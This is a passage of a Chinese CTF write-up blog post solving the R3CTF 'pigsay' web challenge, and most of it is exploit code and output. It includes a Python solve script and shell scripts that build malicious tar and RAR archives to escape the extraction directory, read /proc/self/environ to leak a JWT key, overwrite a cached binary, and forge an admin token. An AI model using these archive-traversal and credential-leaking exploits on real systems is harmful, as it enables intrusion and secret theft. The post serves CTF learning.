class="built_in">type</span>=tarfile.SYMTYPE, linkname=<span class="string">&quot;a/../../&quot;</span>)</span><br><span class="line">            addmemb(<span class="string">&quot;data.txt/&quot;</span>, <span class="built_in">type</span>=tarfile.SYMTYPE, linkname=<span class="string">f&quot;b<span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        req = requests.post(</span><br><span class="line">            <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/api/file/encrypt&quot;</span>, files=&#123;<span class="string">&quot;file&quot;</span>: <span class="built_in">open</span>(<span class="string">&quot;./read.tar.gz&quot;</span>, <span class="string">&quot;rb&quot;</span>)&#125;</span><br><span class="line">        )</span><br><span class="line">        resp = req.json()</span><br><span class="line">        data_enc = resp[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;data.txt&quot;</span>]</span><br><span class="line">        data_str = decrypt(data_enc)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> data_str</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        print_exc()</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        os.remove(<span class="string">&quot;./read.tar.gz&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_file</span>(<span class="params">filename: <span class="built_in">str</span>, content: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    https://github.com/python/cpython/blob/3612d8f51741b11f36f8fb0494d79086bac9390a/Lib/test/test_tarfile.py#L3791</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> tarfile.<span class="built_in">open</span>(<span class="string">&quot;./write.tar.gz&quot;</span>, <span class="string">&quot;w:gz&quot;</span>) <span class="keyword">as</span> tar:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">addmemb</span>(<span class="params">name, **kwargs</span>):</span><br><span class="line">                memb = tarfile.TarInfo(name)</span><br><span class="line">                fileobj = <span class="literal">None</span></span><br><span class="line">                <span class="keyword">for</span> k, v <span class="keyword">in</span> kwargs.items():</span><br><span class="line">                    <span class="keyword">if</span> k == <span class="string">&quot;content&quot;</span>:</span><br><span class="line">                        content = v</span><br><span class="line">                        content = content.encode()</span><br><span class="line">                        memb.size = <span class="built_in">len</span>(content)</span><br><span class="line">                        fileobj = BytesIO(content)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">setattr</span>(memb, k, v)</span><br><span class="line">                tar.addfile(memb, fileobj)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># docker alpine image has 4096</span></span><br><span class="line">            <span class="comment"># assert &quot;PC_PATH_MAX&quot; in os.pathconf_names</span></span><br><span class="line">            <span class="comment"># max_path_len = os.pathconf(&quot;/app&quot;, &quot;PC_PATH_MAX&quot;)</span></span><br><span class="line">            max_path_len = <span class="number">4096</span></span><br><span class="line"></span><br><span class="line">            steps = <span class="string">&quot;abcdefghijklmnop&quot;</span></span><br><span class="line">            path_sep_len = <span class="number">1</span></span><br><span class="line">            <span class="comment"># # TemporaryDirectory len + uuid len + self path len</span></span><br><span class="line">            dest_len = <span class="number">11</span> + <span class="number">32</span> + path_sep_len</span><br><span class="line">            component_len = (max_path_len - dest_len) // (<span class="built_in">len</span>(steps) + path_sep_len)</span><br><span class="line">            component = <span class="string">&quot;d&quot;</span> * component_len</span><br><span class="line"></span><br><span class="line">            path = <span class="string">&quot;&quot;</span></span><br><span class="line">            step_path = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> steps:</span><br><span class="line">                addmemb(os.path.join(path, component), <span class="built_in">type</span>=tarfile.DIRTYPE, mode=<span class="number">0o777</span>)</span><br><span class="line">                addmemb(os.path.join(path, i), <span class="built_in">type</span>=tarfile.SYMTYPE, linkname=component)</span><br><span class="line">                path = os.path.join(path, component)</span><br><span class="line">                step_path = os.path.join(step_path, i)</span><br><span class="line"></span><br><span class="line">            linkpath = os.path.join(*steps, <span class="string">&quot;l&quot;</span> * <span class="number">254</span>)</span><br><span class="line">            parent_segments = [<span class="string">&quot;..&quot;</span>] * <span class="built_in">len</span>(steps)</span><br><span class="line"></span><br><span class="line">            addmemb(</span><br><span class="line">                linkpath,</span><br><span class="line">                <span class="built_in">type</span>=tarfile.SYMTYPE,</span><br><span class="line">                linkname=os.path.join(*parent_segments),</span><br><span class="line">            )</span><br><span class="line">            addmemb(</span><br><span class="line">                <span class="string">&quot;escape&quot;</span>,</span><br><span class="line">                <span class="built_in">type</span>=tarfile.SYMTYPE,</span><br><span class="line">                linkname=os.path.join(linkpath, <span class="string">&quot;../&quot;</span>),</span><br><span class="line">            )</span><br><span class="line">            addmemb(</span><br><span class="line">                <span class="string">&quot;data.txt&quot;</span>,</span><br><span class="line">                <span class="built_in">type</span>=tarfile.LNKTYPE,</span><br><span class="line">                linkname=os.path.join(<span class="string">&quot;escape&quot;</span>, <span class="string">&quot;..&quot;</span> + filename),</span><br><span class="line">            )</span><br><span class="line">            addmemb(</span><br><span class="line">                <span class="string">&quot;data.txt&quot;</span>,</span><br><span class="line">                content=content,</span><br><span class="line">                mode=<span class="number">0o777</span>,</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">        req = requests.post(</span><br><span class="line">            <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/api/file/encrypt&quot;</span>, files=&#123;<span class="string">&quot;file&quot;</span>: <span class="built_in">open</span>(<span class="string">&quot;./write.tar.gz&quot;</span>, <span class="string">&quot;rb&quot;</span>)&#125;</span><br><span class="line">        )</span><br><span class="line">        resp = req.json()</span><br><span class="line">        data_enc = resp[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;data.txt&quot;</span>]</span><br><span class="line">        data_str = decrypt(data_enc)</span><br><span class="line">        <span class="keyword">return</span> data_str</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        print_exc()</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        os.remove(<span class="string">&quot;./write.tar.gz&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec_upgrade_sh</span>(<span class="params">jwt_key: <span class="built_in">str</span></span>):</span><br><span class="line">    req = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/schema&quot;</span>)</span><br><span class="line">    resp = req.text</span><br><span class="line">    uuid = re.search(<span class="string">r&#x27;&quot;/api/admin/upgrade/([a-z0-9]+?)&quot;&#x27;</span>, resp).group(<span class="number">1</span>)</span><br><span class="line">    token = jwt.encode(</span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;username&quot;</span>: <span class="string">&quot;woodwhale&quot;</span>&#125;,</span><br><span class="line">        key=jwt_key,</span><br><span class="line">        algorithm=<span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    upgrade_api = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/api/admin/upgrade/<span class="subst">&#123;uuid&#125;</span>&quot;</span></span><br><span class="line">    req = requests.post(upgrade_api, headers=&#123;<span class="string">&quot;r3-token&quot;</span>: token&#125;)</span><br><span class="line">    resp = req.json()</span><br><span class="line">    <span class="built_in">print</span>(resp)</span><br><span class="line">    <span class="keyword">return</span> resp[<span class="string">&quot;data&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[DEBUG]&quot;</span>, <span class="string">&quot;read file...&quot;</span>)</span><br><span class="line">    env = read_file(<span class="string">&quot;/proc/self/environ&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;env=&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[DEBUG]&quot;</span>, <span class="string">&quot;write file...&quot;</span>)</span><br><span class="line">    write_file(</span><br><span class="line">        <span class="string">&quot;/home/r3ctf/.local/share/uv/tools/pigsay/bin/pigsay&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;#!/bin/sh\necho -e &quot;flag: $(cat /app/flag*)&quot;&#x27;</span>,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[DEBUG]&quot;</span>, <span class="string">&quot;exec sh...&quot;</span>)</span><br><span class="line">    flag = exec_upgrade_sh(re.search(<span class="string">r&quot;JWT_KEY=([^\n]+?)\x00&quot;</span>, env).group(<span class="number">1</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[INFO]&quot;</span>, flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="再看看一位外国老哥的解法"><a href="#再看看一位外国老哥的解法" class="headerlink" title="再看看一位外国老哥的解法"></a>再看看一位外国老哥的解法</h3><p>主要漏洞存在于存档提取逻辑中，其中文件仅在没有适当验证的情况下仅根据文件扩展名提取：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">unzip_file</span>(<span class="params">filepath: <span class="built_in">str</span>, extract_to_filepath: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(filepath) <span class="keyword">as</span> zf:</span><br><span class="line">        zf.extractall(extract_to_filepath)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unrar_file</span>(<span class="params">filepath: <span class="built_in">str</span>, extract_to_filepath: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">import</span> rarfile</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> rarfile.RarFile(filepath) <span class="keyword">as</span> rf:</span><br><span class="line">        rf.extractall(extract_to_filepath)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">un7z_file</span>(<span class="params">filepath: <span class="built_in">str</span>, extract_to_filepath: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">import</span> py7zr</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> py7zr.SevenZipFile(filepath) <span class="keyword">as</span> sf:</span><br><span class="line">        sf.extractall(extract_to_filepath)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">untar_file</span>(<span class="params">filepath: <span class="built_in">str</span>, extract_to_filepath: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">import</span> tarfile</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> tarfile.<span class="built_in">open</span>(filepath, <span class="string">&quot;r:gz&quot;</span>) <span class="keyword">as</span> tf:</span><br><span class="line">        tf.extractall(extract_to_filepath)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uncompress_file</span>(<span class="params">filepath: <span class="built_in">str</span>, handler: <span class="built_in">callable</span></span>):</span><br><span class="line">    file = Path(filepath)</span><br><span class="line">    suffix = <span class="string">&quot;&quot;</span>.join(file.suffixes)</span><br><span class="line">    <span class="keyword">with</span> TemporaryDirectory(uuid4().<span class="built_in">hex</span>) <span class="keyword">as</span> tmp_dir:</span><br><span class="line">        tmp_dir = Path(tmp_dir)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            args = (filepath, <span class="built_in">str</span>(tmp_dir.absolute()))</span><br><span class="line">            <span class="keyword">match</span> suffix:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;.zip&quot;</span>:</span><br><span class="line">                    unzip_file(*args)</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;.rar&quot;</span>:</span><br><span class="line">                    unrar_file(*args)</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;.7z&quot;</span>:</span><br><span class="line">                    un7z_file(*args)</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;.tar.gz&quot;</span>:</span><br><span class="line">                    untar_file(*args)</span><br><span class="line">                <span class="keyword">case</span> _:</span><br><span class="line">                    <span class="keyword">raise</span> Exception(<span class="string">f&quot;Unsupported file type: <span class="subst">&#123;suffix&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="string">&quot;code&quot;</span>: <span class="number">20000</span>,</span><br><span class="line">                <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;success&quot;</span>,</span><br><span class="line">                <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">                    item.name: handler(item.read_text())</span><br><span class="line">                    <span class="keyword">for</span> item <span class="keyword">in</span> tmp_dir.glob(<span class="string">&quot;*.txt&quot;</span>)</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="number">50000</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">f&quot;Uncompress file error: <span class="subst">&#123;e&#125;</span>&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>关键点：服务器在没有任何清理的情况下提取存档内容，导致路径遍历和其他攻击。<br>执行其他特权的唯一路由是&#x2F;api&#x2F;admin&#x2F;upgrade&#x2F;uuid4，它允许执行脚本&#x2F;app&#x2F;upgrade.sh</p>
<p>第 1 步 - 获取管理员路由</p>
<p>通过框架自动公开的路径发现：&#x2F;schema</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8000/schema</span><br></pre></td></tr></table></figure>

<p>从那里，我们获得了完整的路径：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8000/api/admin/upgrade/fe96ce856353412083801dc6ff9eb99f</span><br></pre></td></tr></table></figure>

<p>第 2 步 – CVE-2024-12390：RAR 符号链接攻击</p>
<p>通过制作恶意.rar文件，我们能够覆盖用户缓存目录中的二进制文件。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line">LAST_FOLDER=bin</span><br><span class="line">ATTACK_PATH=/home/r3ctf/.local/share/uv/tools/pigsay/<span class="variable">$LAST_FOLDER</span></span><br><span class="line">ATTACK_FILE=pigsay</span><br><span class="line">SCRIPT=<span class="string">&#x27;#!/bin/sh</span></span><br><span class="line"><span class="string">cat /app/flag_*&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ln</span> -sf <span class="string">&quot;<span class="variable">$ATTACK_PATH</span>&quot;</span> <span class="string">&quot;<span class="variable">$LAST_FOLDER</span>&quot;</span></span><br><span class="line">rar a -ol 1.rar <span class="string">&quot;<span class="variable">$LAST_FOLDER</span>&quot;</span></span><br><span class="line"><span class="built_in">rm</span> -f <span class="string">&quot;<span class="variable">$LAST_FOLDER</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -m 755 <span class="string">&quot;<span class="variable">$LAST_FOLDER</span>&quot;</span></span><br><span class="line"><span class="built_in">umask</span> 022 &amp;&amp; <span class="built_in">printf</span> <span class="string">&#x27;%s\n&#x27;</span> <span class="string">&quot;<span class="variable">$SCRIPT</span>&quot;</span> &gt; <span class="string">&quot;<span class="variable">$LAST_FOLDER</span>/<span class="variable">$ATTACK_FILE</span>&quot;</span></span><br><span class="line"><span class="built_in">chmod</span> +x <span class="string">&quot;<span class="variable">$LAST_FOLDER</span>/<span class="variable">$ATTACK_FILE</span>&quot;</span></span><br><span class="line"></span><br><span class="line">rar a 1.rar <span class="string">&quot;<span class="variable">$LAST_FOLDER</span>/<span class="variable">$ATTACK_FILE</span>&quot;</span></span><br><span class="line"><span class="built_in">rm</span> -rf <span class="string">&quot;<span class="variable">$LAST_FOLDER</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>这替换了脚本upgrade.sh使用的缓存二进制文件pigsay：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">cd</span> /app</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> uv add -U pigsay &amp;&amp; uv tool upgrade pigsay; <span class="keyword">then</span></span><br><span class="line">    uvx pigsay encrypt <span class="string">&quot;[<span class="subst">$(date <span class="string">&quot;+%Y-%m-%d %H:%M:%S&quot;</span>)</span>] Upgrade Success!&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    uvx pigsay encrypt <span class="string">&quot;[<span class="subst">$(date <span class="string">&quot;+%Y-%m-%d %H:%M:%S&quot;</span>)</span>] Upgrade failed!&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>即使二进制文件似乎位于&#x2F;app&#x2F;.venv&#x2F;bin&#x2F;pigsay，实际执行也是通过缓存进行的。这是通过 strace 发现的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(r3ctf-pigsay) /app $ strace -f uvx pigsay 2&gt;&amp;1 | grep pigsay | grep exec</span><br><span class="line">...</span><br><span class="line">[pid   542] execve(&quot;/home/r3ctf/.local/share/uv/tools/pigsay/bin/pigsay&quot;, [&quot;pigsay&quot;], 0x7f08fb292230 /* 13 vars */) = 0</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>第 3 步 – CVE-2024-12718：Tarfile 路径转义</p>
<p>我们利用此漏洞来逃逸解压目录并读取磁盘上的任意文件：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"></span><br><span class="line">ap = arparse = argparse.ArgumentParser()</span><br><span class="line">ap.add_argument(<span class="string">&#x27;tarpath&#x27;</span>, metavar=<span class="string">&#x27;TARBALL&#x27;</span>)</span><br><span class="line">ap.add_argument(<span class="string">&#x27;target&#x27;</span>, metavar=<span class="string">&#x27;TARGET&#x27;</span>)</span><br><span class="line">opts = ap.parse_args()</span><br><span class="line">target = os.path.abspath(opts.target)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> tarfile.<span class="built_in">open</span>(opts.tarpath, <span class="string">&#x27;w:gz&#x27;</span>) <span class="keyword">as</span> tar:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">addmemb</span>(<span class="params">name, **kwargs</span>):</span><br><span class="line">        memb = tarfile.TarInfo(name)</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> kwargs.items():</span><br><span class="line">            <span class="built_in">getattr</span>(memb, k)</span><br><span class="line">            <span class="built_in">setattr</span>(memb, k, v)</span><br><span class="line">        tar.addfile(memb)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># lrw-r--r-- pwn -&gt; .</span></span><br><span class="line">    addmemb(<span class="string">&#x27;pwn.txt&#x27;</span>, <span class="built_in">type</span>=tarfile.SYMTYPE, linkname=<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    <span class="comment"># &quot;pwn&quot; is a very innocent symlink.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># drwxrwxrwx pwn/</span></span><br><span class="line">    addmemb(<span class="string">&#x27;pwn.txt&#x27;</span>, <span class="built_in">type</span>=tarfile.DIRTYPE, mode=<span class="number">0o777</span>)</span><br><span class="line">    <span class="comment"># But now &quot;pwn&quot; is also a directory, so it&#x27;s scheduled to have its</span></span><br><span class="line">    <span class="comment"># metadata updated later.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># lrw-r--r-- pwn -&gt; x/x/x/x/⋯⋯⋯/x/../../../../⋯⋯⋯/../TARGET</span></span><br><span class="line">    addmemb(<span class="string">&#x27;pwn.txt&#x27;</span>, <span class="built_in">type</span>=tarfile.SYMTYPE, linkname=(<span class="string">&#x27;x/&#x27;</span> * <span class="number">99</span> + <span class="string">&#x27;../&#x27;</span> * <span class="number">99</span> + target))</span><br><span class="line">    <span class="comment"># Oops, &quot;pwn&quot; is not so innocent any more.</span></span><br><span class="line">    <span class="comment"># But technically it&#x27;s still pointing inside the dest dir,</span></span><br><span class="line">    <span class="comment"># so it doesn&#x27;t upset the &quot;data&quot; filter.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># lrw-r--r-- x/x/x/x/⋯⋯⋯/x -&gt; ../../../⋯⋯⋯/..</span></span><br><span class="line">    addmemb((<span class="string">&#x27;x/&#x27;</span> * <span class="number">99</span>), <span class="built_in">type</span>=tarfile.SYMTYPE, linkname=(<span class="string">&#x27;../&#x27;</span> * <span class="number">98</span>))</span><br><span class="line">    <span class="comment"># The newly created symlink symlink points to the dest dir,</span></span><br><span class="line">    <span class="comment"># so it&#x27;s OK for the &quot;data&quot; filter.</span></span><br><span class="line">    <span class="comment"># But now &quot;pwn&quot; points to the target (outside the dest dir).</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gen_tar.py target.tar.gz ../../../proc/self/environ</span><br></pre></td></tr></table></figure>

<p>这允许从进程中泄漏环境变量：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HOME=/home/r3ctf</span><br><span class="line">HOSTNAME=12fa963dce40</span><br><span class="line">JWT_KEY=8346ea5cec134e078470d40a3a6c1592</span><br><span class="line">LOGNAME=r3ctf</span><br><span class="line">PATH=/app/.venv/bin:/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">PIG_KEY=5f62bbfd4182406292799469d9ea07c0</span><br><span class="line">PWD=/app</span><br><span class="line">PYTHON_SHA256=7ac9e84844bbc0a5a8f1f79a37a68b3b8caf2a58b4aa5999c49227cb36e70ea6</span><br><span class="line">PYTHON_VERSION=3.14.0b2</span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">SHLVL=2</span><br><span class="line">USER=r3ctf</span><br><span class="line">UV=/bin/uv</span><br><span class="line">UV_RUN_RECURSION_DEPTH=1</span><br><span class="line">VIRTUAL_ENV=/app/.venv</span><br></pre></td></tr></table></figure>

<p>第 4 步 – 生成有效的管理员 JWT</p>
<p>一旦我们有了JWT_KEY，我们就可以生成一个有效的管理员令牌：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">JWT_KEY=<span class="string">b&quot;8346ea5cec134e078470d40a3a6c1592&quot;</span></span><br><span class="line">token = jwt.encode(&#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;admin&quot;</span>&#125;, JWT_KEY, algorithm=<span class="string">&quot;HS256&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(token)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.tsrBCvTJwR9riZ86BMA9VlOYZHZMMae_WfX5l5YopFU</span><br></pre></td></tr></table></figure>

<p>第 5 步 – 触发漏洞利用并读取flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">res = requests.post(</span><br><span class="line">    <span class="string">&#x27;http://&lt;url&gt;:&lt;port&gt;/api/admin/upgrade/f7693ee87ba94904b97080d3819d1425&#x27;</span>,</span><br><span class="line">    headers=&#123;<span class="string">&#x27;r3-token&#x27;</span>: token&#125;</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://sakuraraindrop.github.io">cheng_xing</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://sakuraraindrop.github.io/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/">https://sakuraraindrop.github.io/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://sakuraraindrop.github.io" target="_blank">cheng_xing's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/php%E7%89%B9%E6%80%A7/">php特性</a><a class="post-meta__tags" href="/tags/ssti/">ssti</a><a class="post-meta__tags" href="/tags/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">pickle反序列化</a><a class="post-meta__tags" href="/tags/pyjail/">pyjail</a><a class="post-meta__tags" href="/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">原型链污染</a><a class="post-meta__tags" href="/tags/%E6%9E%81%E8%87%B4CMS/">极致CMS</a><a class="post-meta__tags" href="/tags/go%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">go模板注入</a><a class="post-meta__tags" 